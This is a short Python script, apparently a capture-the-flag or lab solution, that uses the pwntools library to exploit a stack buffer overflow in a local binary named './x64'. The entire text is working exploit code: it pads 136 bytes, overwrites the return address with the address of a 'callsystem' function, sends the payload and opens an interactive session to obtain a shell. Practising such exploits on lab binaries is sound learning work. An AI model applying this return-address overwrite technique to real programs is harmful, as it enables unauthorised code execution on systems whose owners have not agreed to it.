from pwn import *

context(arch='amd64',os='linux',log_level='debug')

callsystem=0x0000000000401142
payload= b'A'*136 + p64(callsystem)
p=process('./x64')
p.send(payload)
p.interactive()